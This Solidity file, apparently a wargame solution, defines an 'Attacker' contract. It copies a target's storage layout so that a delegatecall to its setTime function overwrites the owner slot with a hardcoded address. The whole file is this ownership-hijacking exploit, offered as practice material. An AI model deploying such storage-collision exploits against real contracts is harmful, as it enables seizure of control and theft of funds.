// SPDX-License-Identifier: UNLICENSED
pragma experimental ABIEncoderV2;
pragma solidity ^0.8.0;
import "./Contract.sol";

contract Attacker {
  // public library contracts 
  //slot 0
  address public timeZone1Library;
  //slot 1
  address public timeZone2Library;
  //slot 2
  address public owner; 
  //slot 3


  function setTime(uint _time) public {
    owner = 0x80805ae3cbE23715C1f1807A03C5fb669541C2A9; 
  }
}
